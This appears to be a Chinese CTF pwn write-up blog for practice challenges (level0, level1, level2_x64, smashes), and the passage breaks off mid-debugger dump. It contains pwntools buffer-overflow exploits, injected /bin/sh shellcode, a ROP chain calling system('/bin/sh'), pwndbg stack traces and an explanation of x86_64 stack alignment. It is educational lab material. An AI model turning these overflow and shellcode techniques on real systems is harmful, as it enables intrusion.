patchelf --set-interpreter /home/pwn/Software/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/ld-linux.so.2</span> <br><span class="hljs-meta">$</span><span class="bash"> ldd ret2libc3</span><br>linux-gate.so.1 (0xf7f59000)<br>/home/pwn/桌面/题目/ROP/ret2libc3/libc-2.23.so (0xf7da0000)<br>/home/pwn/Software/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/ld-linux.so.2 =&gt; /lib/ld-linux.so.2 (0xf7f5a000)<br></code></pre></td></tr></table></figure><h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./level0&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;World\n&#x27;</span>)<br><br>callsys_addr = <span class="hljs-number">0x00400596</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">0x8</span>) + p64(callsys_addr)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>栈对齐导致 exp 打不通。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./level0&#x27;</span>)<br>io.recvline()<br><br>callsys_addr = <span class="hljs-number">0x00400596</span><br>ret = <span class="hljs-number">0x00400431</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">0x8</span>) + p64(ret) + p64(callsys_addr)<br><span class="hljs-comment"># callsys_addr = 0x00400597/A</span><br><span class="hljs-comment"># payload = b&#x27;A&#x27; * (0x80 + 0x8) + p64(callsys_addr)</span><br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">00:0000│ rsi rsp  0x7fffffffded0 ◂— &#x27;AAAAAAAA\n&#x27;<br>01:0008│          0x7fffffffded8 ◂— 0xa /* &#x27;\n&#x27; */<br>02:0010│          0x7fffffffdee0 ◂— 0x0<br>... ↓<br>08:0040│          0x7fffffffdf10 —▸ 0x400040 ◂— 0x500000006<br>09:0048│          0x7fffffffdf18 ◂— 0xf0b5ff<br>0a:0050│          0x7fffffffdf20 ◂— 0xc2<br>0b:0058│          0x7fffffffdf28 —▸ 0x7fffffffdf57 ◂— 0x4005f300<br>0c:0060│          0x7fffffffdf30 ◂— 0x1<br>0d:0068│          0x7fffffffdf38 —▸ 0x40064d (__libc_csu_init+77) ◂— add    rbx, 1<br>0e:0070│          0x7fffffffdf40 —▸ 0x400600 (__libc_csu_init) ◂— push   r15<br>0f:0078│          0x7fffffffdf48 —▸ 0x7ffff7ffe190 ◂— 0x0<br>10:0080│ rbp      0x7fffffffdf50 —▸ 0x7fffffffdf70 ◂— 0x0<br>11:0088│          0x7fffffffdf58 —▸ 0x4005f3 (main+45) ◂— leave<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = gdb.debug(<span class="hljs-string">&quot;./level0&quot;</span>,<span class="hljs-string">&quot;b *0x0040059A&quot;</span>)<br><br>callsys_addr = <span class="hljs-number">0x00400596</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">0x8</span>) + p64(callsys_addr)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">───────────────────────────────[ DISASM]──────────────────────────────────────<br> ► <span class="hljs-number">0x7fb830d3ffbc</span> &lt;do_system+<span class="hljs-number">364</span>&gt;    <span class="hljs-keyword">movaps</span> xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span> + <span class="hljs-number">0x50</span>], <span class="hljs-built_in">xmm0</span><br>   <span class="hljs-number">0x7fb830d3ffc1</span> &lt;do_system+<span class="hljs-number">369</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span> + <span class="hljs-number">0x68</span>], <span class="hljs-number">0</span><br>   <span class="hljs-number">0x7fb830d3ffca</span> &lt;do_system+<span class="hljs-number">378</span>&gt;    <span class="hljs-keyword">call</span>   posix_spawn &lt;posix_spawn&gt;<br></code></pre></td></tr></table></figure><p>得知 <code>glibc2.27</code> 以后引入 <code>xmm寄存器</code> ，记录程序状态，会执行 movaps 指令，要求 rsp 是按 16字节对齐的 。</p><p>是 xmm寄存器的问题，当 glibc 版本大于 2.27 的时候，系统调用 <code>system(&quot;/bin/sh&quot;)</code> 之前有个 xmm 寄存器使用。要确保 rsp 是与 16 对齐的，也就是末尾必须是 0 。</p><p>参考：</p><p><a href="https://blog.csdn.net/fjh1997/article/details/107695261">关于jarvisOJ level0远程打得通本地打不通的问题_fjh1997的博客-CSDN博客</a><br><a href="https://blog.csdn.net/weixin_42016744/article/details/122422452">pwn system(“/bin/sh“)失败的原因 flypwn的博客-CSDN博客_system(/bin/sh)</a><br><a href="https://www.cnblogs.com/Rookle/p/12871878.html">在一些64位的glibc的payload调用system函数失败问题 - Rookle - 博客园 (cnblogs.com)</a></p><h2 id="栈的对齐问题"><a href="#栈的对齐问题" class="headerlink" title="栈的对齐问题"></a>栈的对齐问题</h2><blockquote><p><a href="https://blog.csdn.net/tcctw/article/details/106827439">x86_64 Linux 运行时栈的字节对齐_tcctw的博客-CSDN博客</a><br><a href="https://blog.csdn.net/qq_29328443/article/details/107232025">x86<em>64汇编之四：函数调用、调用约定 ponnylv的博客-CSDN博客</em>汇编调用函数</a></p></blockquote><p>其实，栈的对齐问题来源于上述文档中的一段话：</p><blockquote><p>In addition to registers, each function has a frame on the run-time stack. This stack grows downwards from high addresses. Figure 3.3 shows the stack organization. <strong>The end of the input argument area shall be aligned on a 16</strong> (32 or 64, if <strong>m256 or </strong>m512 is passed on stack) <strong>byte boundary</strong>. In other words, <strong>the value (%rsp + 8) is always a multiple of 16</strong> (32 or 64) <strong>when control is transferred to the function entry point.</strong> The stack pointer, %rsp, always points to the end of the latest allocated stack frame.</p></blockquote><p>System V AMD64 调用约定要求栈必须按16字节对齐，也就是说，在调用call指令之前（the end of the input argument area），%rsp指针必须是16的倍数（对应16进制是最后1位是0）。按16字节对齐的原因是，现代 x86_64 计算机引入了 SSE 和 AVX 指令，这些指令支持 SIMD，能极大提升处理速度。但是这些指令要求必须从16字节的整数倍的地址处取数据，为了顾及这些指令，才有了上述对齐要求。</p><p>上面这段文档第二句为什么又说是 %rsp + 8 必须是16的倍数呢？实际上，它说的%rsp是执行完 call 指令之后的 %rsp，执行 call 指令会导致栈中压入一个8个字节的返回地址。原来 %rsp 是按16字节对齐的，压入8字节地址后，显然是 %rsp + 8 才是16的倍数。</p><p>此外，在该调用约定下，函数的起始地址始终是按8字节对齐的（misaligned by 8 bytes），即起始地址是8的倍数。（至于为什么函数起始地址是8字节对齐没大看懂）。</p><p>参考：<a href="https://stackoverflow.com/a/56066628/6570986">https://stackoverflow.com/a/56066628/6570986</a></p><p>总结一下，函数起始地址按8字节对齐和栈按16字节对齐 这两点是我们在编写汇编代码时需要注意的，如果不注意，就会编写出错误的代码。</p><p>更多关于栈的对齐，可以参考：</p><p><a href="https://stackoverflow.com/questions/4175281/what-does-it-mean-to-align-the-stack">https://stackoverflow.com/questions/4175281/what-does-it-mean-to-align-the-stack</a><br><a href="https://stackoverflow.com/questions/38335212/calling-printf-in-x86-64-using-gnu-assembler">https://stackoverflow.com/questions/38335212/calling-printf-in-x86-64-using-gnu-assembler</a><br><a href="https://nickdesaulniers.github.io/blog/2014/04/18/lets-write-some-x86-64/">https://nickdesaulniers.github.io/blog/2014/04/18/lets-write-some-x86-64/</a></p><h2 id="解决一种pwn本地打不通远程打得通的问题"><a href="#解决一种pwn本地打不通远程打得通的问题" class="headerlink" title="解决一种pwn本地打不通远程打得通的问题"></a>解决一种pwn本地打不通远程打得通的问题</h2><blockquote><p>原文链接：<a href="https://blog.csdn.net/fjh1997/article/details/105347161">https://blog.csdn.net/fjh1997/article/details/105347161</a></p></blockquote><p>最近就遇到了这样的怪题目，本地劫持指针到 <code>execve()</code> 的 <code>int 80</code> 系统调用的时候，本地会卡住，远程却可以，我的建立的 <code>shellcode</code> 是这样的：</p><pre><code>push 0x68push 0x732f2f2fpush 0x6e69622fmov ebx, espxor ecx, ecxpush 0x8pop eaxinc eaxinc eaxinc eaxint 0x80</code></pre><p>之后调试的时候发现，int 调用的时候 envp 参数有点奇怪，本来应该是 0，现在却是 The_Pursuit_of_happiness</p><p>这个时候才想起来我 envp 没有清空，也就是少了一条 <code>xor edx,edx</code> 指令，之后加上去后本地就能打通 。</p><pre><code>push 0x68push 0x732f2f2fpush 0x6e69622fmov ebx, espxor ecx, ecxxor edx,edxpush 0x8pop eaxinc eaxinc eaxinc eaxint 0x80</code></pre><p>综上所述 pwn 本地打不通远程打通的问题原因之一是由于环境变量指针不一样，远程的环境变量指针可能恰好符合这个程序，而本地的不符合，所以要清 0。所以要按照 envp=0 调用 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">execve(path=<span class="hljs-string">&#x27;/bin///sh&#x27;</span>, argv=[<span class="hljs-string">&#x27;sh&#x27;</span>], envp=<span class="hljs-number">0</span>) <br></code></pre></td></tr></table></figure><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, arch = <span class="hljs-string">&#x27;i386&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>shellcode = asm(shellcraft.sh())<br>io = gdb.debug(<span class="hljs-string">&quot;./level1&quot;</span>,<span class="hljs-string">&quot;b *0x080484B6&quot;</span>)<br><span class="hljs-comment">#io = process(&#x27;./level1&#x27;)</span><br>text = io.recvline()[<span class="hljs-number">14</span>: -<span class="hljs-number">2</span>]<br>buf_addr = <span class="hljs-built_in">int</span>(text, <span class="hljs-number">16</span>)<br><br>payload = shellcode + <span class="hljs-string">b&#x27;\x90&#x27;</span> * (<span class="hljs-number">0x88</span> + <span class="hljs-number">0x4</span> - <span class="hljs-built_in">len</span>(shellcode)) + p32(buf_addr)<br><span class="hljs-comment"># payload = b&#x27;\x90&#x27; * (0x88 + 0x4 - len(shellcode)) + shellcode + p32(buf_addr)# 打不通</span><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">  <span class="hljs-number">0xfff0a98c</span>    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">esp</span><br>  <span class="hljs-number">0xfff0a98e</span>    <span class="hljs-keyword">push</span>   <span class="hljs-number">0x1010101</span><br>  <span class="hljs-number">0xfff0a993</span>    <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>], <span class="hljs-number">0x1016972</span><br>  <span class="hljs-number">0xfff0a99a</span>    <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">ecx</span><br>  <span class="hljs-number">0xfff0a99c</span>    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>], <span class="hljs-built_in">al</span><br>   ↓<br>► <span class="hljs-number">0xfff0a99d</span>    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>], <span class="hljs-built_in">al</span><br>  <span class="hljs-number">0xfff0a99f</span>    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebx</span> + <span class="hljs-number">0x68</span>], <span class="hljs-number">dh</span><br>  <span class="hljs-number">0xfff0a9a2</span>    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>], <span class="hljs-built_in">al</span><br>  <span class="hljs-number">0xfff0a9a4</span>    <span class="hljs-keyword">das</span>    <br>  <span class="hljs-number">0xfff0a9a5</span>    <span class="hljs-keyword">bound</span>  <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ecx</span> + <span class="hljs-number">0x6e</span>]<br>  <span class="hljs-number">0xfff0a9a8</span>    <span class="hljs-keyword">das</span>    <br><br><br><br>  <span class="hljs-number">0x80484b6</span>  &lt;vulnerable_function+<span class="hljs-number">59</span>&gt;    <span class="hljs-keyword">ret</span>    <br>   ↓<br>► <span class="hljs-number">0xff8f0900</span>                             <span class="hljs-keyword">push</span>   <span class="hljs-number">0x68</span><br>  <span class="hljs-number">0xff8f0902</span>                             <span class="hljs-keyword">push</span>   <span class="hljs-number">0x732f2f2f</span><br>  <span class="hljs-number">0xff8f0907</span>                             <span class="hljs-keyword">push</span>   <span class="hljs-number">0x6e69622f</span><br>  <span class="hljs-number">0xff8f090c</span>                             <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">esp</span><br>  <span class="hljs-number">0xff8f090e</span>                             <span class="hljs-keyword">push</span>   <span class="hljs-number">0x1010101</span><br>  <span class="hljs-number">0xff8f0913</span>                             <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>], <span class="hljs-number">0x1016972</span><br>  <span class="hljs-number">0xff8f091a</span>                             <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">ecx</span><br>  <span class="hljs-number">0xff8f091c</span>                             <span class="hljs-keyword">push</span>   <span class="hljs-built_in">ecx</span><br>  <span class="hljs-number">0xff8f091d</span>                             <span class="hljs-keyword">push</span>   <span class="hljs-number">4</span><br>  <span class="hljs-number">0xff8f091f</span>                             <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">ecx</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00000060</span>  <span class="hljs-number">6</span>a <span class="hljs-number">68</span> <span class="hljs-number">68</span> <span class="hljs-number">2</span>f  <span class="hljs-number">2</span>f <span class="hljs-number">2</span>f <span class="hljs-number">73</span> <span class="hljs-number">68</span>  <span class="hljs-number">2</span>f <span class="hljs-number">62</span> <span class="hljs-number">69</span> <span class="hljs-number">6</span>e  <span class="hljs-number">89</span> e<span class="hljs-number">3</span> <span class="hljs-number">68</span> <span class="hljs-number">01</span>  │jhh/│//sh│/bin│··h·│<br><span class="hljs-attribute">00000070</span>  <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">81</span>  <span class="hljs-number">34</span> <span class="hljs-number">24</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span>  <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">31</span> c<span class="hljs-number">9</span>  <span class="hljs-number">51</span> <span class="hljs-number">6</span>a <span class="hljs-number">04</span> <span class="hljs-number">59</span>  │····│<span class="hljs-number">4</span>$ri│··<span class="hljs-number">1</span>·│Qj·Y│<br><span class="hljs-attribute">00000080</span>  <span class="hljs-number">01</span> e<span class="hljs-number">1</span> <span class="hljs-number">51</span> <span class="hljs-number">89</span>  e<span class="hljs-number">1</span> <span class="hljs-number">31</span> d<span class="hljs-number">2</span> <span class="hljs-number">6</span>a  <span class="hljs-number">0</span>b <span class="hljs-number">58</span> cd <span class="hljs-number">80</span>  b<span class="hljs-number">0</span> <span class="hljs-number">47</span> c<span class="hljs-number">7</span> ff <br><br><br><span class="hljs-attribute">00000000</span>  <span class="hljs-number">6</span>a <span class="hljs-number">68</span> <span class="hljs-number">68</span> <span class="hljs-number">2</span>f  <span class="hljs-number">2</span>f <span class="hljs-number">2</span>f <span class="hljs-number">73</span> <span class="hljs-number">68</span>  <span class="hljs-number">2</span>f <span class="hljs-number">62</span> <span class="hljs-number">69</span> <span class="hljs-number">6</span>e  <span class="hljs-number">89</span> e<span class="hljs-number">3</span> <span class="hljs-number">68</span> <span class="hljs-number">01</span>  │jhh/│//sh│/bin│··h·│<br><span class="hljs-attribute">00000010</span>  <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">81</span>  <span class="hljs-number">34</span> <span class="hljs-number">24</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span>  <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">31</span> c<span class="hljs-number">9</span>  <span class="hljs-number">51</span> <span class="hljs-number">6</span>a <span class="hljs-number">04</span> <span class="hljs-number">59</span>  │····│<span class="hljs-number">4</span>$ri│··<span class="hljs-number">1</span>·│Qj·Y│<br><span class="hljs-attribute">00000020</span>  <span class="hljs-number">01</span> e<span class="hljs-number">1</span> <span class="hljs-number">51</span> <span class="hljs-number">89</span>  e<span class="hljs-number">1</span> <span class="hljs-number">31</span> d<span class="hljs-number">2</span> <span class="hljs-number">6</span>a  <span class="hljs-number">0</span>b <span class="hljs-number">58</span> cd <span class="hljs-number">80</span>  <span class="hljs-number">90</span> <span class="hljs-number">90</span> <span class="hljs-number">90</span> <span class="hljs-number">90</span>  │··Q·│·<span class="hljs-number">1</span>·j│·X··│····│<br></code></pre></td></tr></table></figure><h2 id="level2-x64"><a href="#level2-x64" class="headerlink" title="level2_x64"></a>level2_x64</h2><p>level2 gdb 无法正常调试 。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> b *0x400619<span class="hljs-comment"># 无法加断点run</span></span><br>Starting program: /home/pwn/桌面/题目/练习题/pwn2_x64/level2_x64 <br>[Attaching after process 4686 vfork to child process 4690]<br>[New inferior 2 (process 4690)]<br>[Detaching vfork parent process 4686 after child exec]<br>[Inferior 1 (process 4686) detached]<br>process 4690 is executing new program: /usr/bin/dash<br>Warning:<br>Cannot insert breakpoint 1.<br>Cannot access memory at address 0x400619<br><span class="hljs-meta"></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> b main<span class="hljs-comment"># 运行至 call   system@plt &lt;system@plt&gt; 出错</span></span><br>[Attaching after process 4764 vfork to child process 4769]<br>[New inferior 2 (process 4769)]<br>[Detaching vfork parent process 4764 after child exec]<br>[Inferior 1 (process 4764) detached]<br>process 4769 is executing new program: /usr/bin/dash<br>Error in re-setting breakpoint 1: Function &quot;main&quot; not defined.<br>Input:<br>[Inferior 2 (process 4769) exited normally]<br></code></pre></td></tr></table></figure><p>_system 地址不可行 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./level2_x64&quot;</span>)<br>io.recvline()<br><br><span class="hljs-comment">#system_addr=0x00000000004004c0# _system</span><br>system_addr=<span class="hljs-number">0x000000000040063E</span><span class="hljs-comment"># call    _system</span><br>poprdi_drt=<span class="hljs-number">0x00000000004006b3</span><br>binsh_addr=<span class="hljs-number">0x0000000000600A90</span><br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">8</span>+p64(poprdi_drt)+p64(binsh_addr)+p64(system_addr)<br><br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="smashes"><a href="#smashes" class="headerlink" title="smashes"></a>smashes</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> search CTF</span><br>smashes         0x400d21 push   r12 /* &quot;CTF&#123;Here&#x27;s the flag on server&#125;&quot; */<br>smashes         0x600d21 &quot;CTF&#123;Here&#x27;s the flag on server&#125;&quot;<br>warning: Unable to access 16000 bytes of target memory at 0x7ffff7bd4d02, halting search.<br>[stack]         0x7fffffffe3fe &#x27;CTF:@/tmp/.ICE-unix/1217,unix/CTF:/tmp/.ICE-unix/1217&#x27;<br>[stack]         0x7fffffffe41c &#x27;CTF:/tmp/.ICE-unix/1217&#x27;<br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> search samshes</span><br>warning: Unable to access 16000 bytes of target memory at 0x7ffff7bd4d06, halting search.<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> stack</span><br>00:0000│ rsp  0x7fffffffdf78 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax<br>01:0008│      0x7fffffffdf80 ◂— 0x1<br>02:0010│      0x7fffffffdf88 —▸ 0x7fffffffe058 —▸ 0x7fffffffe38d ◂— 0x77702f656d6f682f (&#x27;/home/pw&#x27;)<br>03:0018│      0x7fffffffdf90 ◂— 0x1f7ffcca0<br>04:0020│      0x7fffffffdf98 —▸ 0x4006d0 ◂— sub    rsp, 8<br>05:0028│      0x7fffffffdfa0 ◂— 0x0<br>06:0030│      0x7fffffffdfa8 ◂— 0x46bc826743e3b977<br>07:0038│      0x7fffffffdfb0 —▸ 0x4006ee ◂— xor    ebp, ebp<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> x/2s 0x7fffffffe38d</span><br>0x7fffffffe38d:&quot;/home/pwn/桌面/题目/练习题/smashes/smashes&quot;<br>0x7fffffffe3bf:&quot;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&quot;<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> stack 70</span><br>00:0000│ rax rsp  0x7fffffffde40 ◂— &#x27;AAAAAAAA&#x27;<br>01:0008│ rdi      0x7fffffffde48 ◂— 0x0<br>... ↓<br>04:0020│          0x7fffffffde60 —▸ 0x7ffff7ffea88 —▸ 0x7ffff7ffe9b8 —▸ 0x7ffff7ffe728 —▸ 0x7ffff7ffe700 ◂— ...<br>05:0028│          0x7fffffffde68 —▸ 0x7fffffffdea0 —▸ 0x7ffff7ffb2a8 ◂— add    byte ptr [rax], al /* &#x27;J&#x27; */<br>06:0030│          0x7fffffffde70 ◂— 0x340<br>07:0038│          0x7fffffffde78 —▸ 0x7fffffffde90 ◂— 0xffffffff<br>08:0040│          0x7fffffffde80 ◂— 0x6562b026<br>09:0048│          0x7fffffffde88 —▸ 0x7ffff7b99727 ◂— pop    rdi /* &#x27;__vdso_getcpu&#x27; */<br>0a:0050│          0x7fffffffde90 ◂— 0xffffffff<br>0b:0058│          0x7fffffffde98 —▸ 0x7ffff7ffe718 —▸ 0x7ffff7ff7000 —▸ 0x7ffff7a0d000 ◂— jg     0x7ffff7a0d047<br>0c:0060│          0x7fffffffdea0 —▸ 0x7ffff7ffb2a8 ◂— add    byte ptr [rax], al /* &#x27;J&#x27; */<br>0d:0068│          0x7fffffffdea8 —▸ 0x7ffff7ffe700 —▸ 0x7ffff7ffb000 ◂— jg     0x7ffff7ffb047<br>0e:0070│          0x7fffffffdeb0 —▸ 0x7fffffffde01 ◂— 0x7fffffffe0<br>0f:0078│          0x7fffffffdeb8 ◂— 0x2ca4b2531b62<br>10:0080│          0x7fffffffdec0 ◂— 0x2<br>11:0088│          0x7fffffffdec8 ◂— 0x8000000000000006<br>12:0090│          0x7fffffffded0 ◂— 0x0<br>... ↓<br>18:00c0│          0x7fffffffdf00 ◂— 0x1<br>19:00c8│          0x7fffffffdf08 —▸ 0x7fffffffe068 —▸ 0x7fffffffe3bf ◂— &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;<br>1a:00d0│          0x7fffffffdf10 —▸ 0x7ffff7dd2620 